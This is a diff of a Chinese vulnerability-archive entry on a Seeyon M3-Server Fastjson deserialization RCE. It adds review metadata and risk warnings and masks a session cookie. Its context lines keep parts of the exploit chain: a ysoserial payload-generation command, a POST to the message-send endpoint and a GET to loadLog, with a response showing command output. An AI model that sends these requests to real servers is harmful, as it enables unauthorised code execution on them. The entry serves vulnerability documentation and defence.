@@ -1,11 +1,52 @@
 ---
-fofa: "搜索语句"
 source: "MrWQ/vulnerability-paper"
+title: "致远M3-Server / Fastjson+c3p0 消息日志写入→loadLog二次反序列化远程代码执行"
+product: "致远M3-Server / Fastjson+c3p0"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "6_1sp1来自接口/标题；完整版本及Fastjson/JDK/BeanUtils依赖未知"
+prerequisites: "请求无凭证，但未审全局认证"
+side_effects: "命令/代码执行示例可能改变主机状态"
+review_date: "2026-10-02"
+source_url: "https://mp.weixin.qq.com/s/L9SoaJfgsWI67DTFalc5SA"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9C%20M3-server%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88%E9%99%84%20POC%EF%BC%89.md"
+fofa_unverified: "搜索语句"
+id: "vw-889ca7263fef61c8a9a6d4d3"
+entity_id: "ve-889ca7263fef61c8a9a6d4d3"
+schema_version: "1"
 ---
 
-# 致远 M3-server 反序列化 RCE 漏洞复现（附 POC）
+# 致远M3-Server / Fastjson+c3p0 消息日志写入→loadLog二次反序列化远程代码执行
 
-<meta name="referrer" content="no-referrer"/>
+## 条目说明
+
+- 对象与具体问题：致远M3-Server / Fastjson+c3p0；消息日志写入→loadLog二次反序列化RCE
+- 版本、配置及部署条件：6_1sp1来自接口/标题；完整版本及Fastjson/JDK/BeanUtils依赖未知
+- 认证与权限前提：请求无凭证，但未审全局认证
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 完整文本/HTTP/超长hex载荷和YAML已读；内嵌序列化字节码未反编译或执行
+- 两步链和成功响应文本明确，较其他截图报告完整；TomcatCmdEcho应区分一次回显代码与持久内存马
+- nuclei DSL第二步却检查body_1反斜杠，不是body_2命令输出，且引号/反斜杠转义损坏；verified:true不能当本地验证
+- Host含\{\{Hostname\}\}转码，JSON与HTTP头缺空行
+- 包含日志持久污染和命令执行，应标侵入式而非安全检测
+
+## 操作风险
+
+命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/L9SoaJfgsWI67DTFalc5SA)
 
 免责申明：**本文内容为学习笔记分享，仅供技术学习参考，请勿用作违法用途，任何个人和组织利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责，与作者无关！！！**
@@ -73,7 +114,7 @@ java -jar ysoserial-main-49888d3191-1.jar CommonsBeanutils192NOCC "CLASS:TomcatC
 
 将生成的十六进制数据复制到到 PoC 中 HEX 处，向靶场发送如下数据包
 
-```
+```http
 POST /mobile_portal/api/pns/message/send/batch/6_1sp1 HTTP/1.1
 Host: x.x.x.x
 User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
@@ -113,7 +154,7 @@ Server: SY8045
 
 /mobile_portal/api/systemLog/pns/loadLog/app.log 接口执行命令
 
-```
+```http
 GET /mobile_portal/api/systemLog/pns/loadLog/app.log HTTP/1.1
 Host: x.x.x.x
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
@@ -136,7 +177,7 @@ Cache-Control: private
 Date: Fri, 24 Nov 2023 02:17:21 GMT
 Expires: Thu, 01 Jan 1970 00:00:00 GMT
 Server: SY8045
-Set-Cookie: JSESSIONID=KXAIEP2JD16C9F6A38E975D109IKJ2J; Path=/mobile_portal; HttpOnly
+Set-Cookie: JSESSIONID=K*****************************J; Path=/mobile_portal; HttpOnly
 windows-n30l5ds\administrator
 windows-n30l5ds\administrator
 {"code":200,"data":[],"message":"success","time":1700792242558,"version":"1.0"}
